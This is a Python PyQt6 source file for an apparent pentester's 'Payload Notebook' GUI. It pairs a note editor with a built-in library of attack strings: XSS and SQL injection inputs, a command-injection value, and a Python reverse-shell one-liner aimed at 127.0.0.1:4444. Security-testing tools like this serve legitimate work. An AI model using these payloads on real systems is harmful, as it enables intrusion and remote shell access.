import os
from PyQt6.QtWidgets import QWidget, QTextEdit, QVBoxLayout, QHBoxLayout, QPushButton, QListWidget, QLabel, QFileDialog

class PayloadNotebook(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Twin-Browser: Payload Notebook")
        self.resize(700, 500)

        # 1. Payload Library දත්ත
        self.payloads = {
            "XSS: Basic Alert": "<script>alert('XSS')</script>",
            "XSS: Image Error": "<img src=x onerror=alert(1)>",
            "SQLi: Auth Bypass": "' OR '1'='1' --",
            "SQLi: Union Select": "' UNION SELECT NULL, NULL, NULL --",
            "Command Injection": "; ls -la",
            "Reverse Shell (Python)": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        }

        # 2. UI කොටස් නිර්මාණය
        self.payload_list = QListWidget()
        self.payload_list.addItems(self.payloads.keys())
        self.payload_list.itemClicked.connect(self.insert_payload)

        self.text_area = QTextEdit()
        self.text_area.setPlaceholderText("Write your notes or modify payloads here...")
        
        # --- Auto-save සම්බන්ධ කිරීම ---
        self.text_area.textChanged.connect(self.auto_save)

        self.save_btn = QPushButton("Export to File")
        self.save_btn.clicked.connect(self.save_file)

        # 3. Layout සැකසීම
        left_layout = QVBoxLayout()
        left_layout.addWidget(QLabel("Payload Library:"))
        left_layout.addWidget(self.payload_list)

        right_layout = QVBoxLayout()
        right_layout.addWidget(QLabel("Editor:"))
        right_layout.addWidget(self.text_area)
        right_layout.addWidget(self.save_btn)

        main_layout = QHBoxLayout()
        main_layout.addLayout(left_layout, 1)
        main_layout.addLayout(right_layout, 2)
        self.setLayout(main_layout)

        # 4. මෘදුකාංගය විවෘත වන විට පරණ නෝට්ස් ඇත්නම් load කිරීම
        self.load_notes()

    def auto_save(self):
        """ ලියන දේ එසැණින් special_notes.txt ගොනුවට ලියයි """
        content = self.text_area.toPlainText()
        try:
            with open("special_notes.txt", "w", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            print(f"Auto-save error: {e}")

    def load_notes(self):
        """ කලින් සේව් කළ නෝට්ස් තිබේ නම් ඒවා නැවත පෙන්නුම් කරයි """
        if os.path.exists("special_notes.txt"):
            try:
                with open("special_notes.txt", "r", encoding="utf-8") as f:
                    self.text_area.setPlainText(f.read())
            except Exception as e:
                print(f"Error loading notes: {e}")

    def insert_payload(self, item):
        payload_text = self.payloads.get(item.text())
        self.text_area.append(payload_text)

    def save_file(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export Note", "", "Text Files (*.txt)")
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.text_area.toPlainText())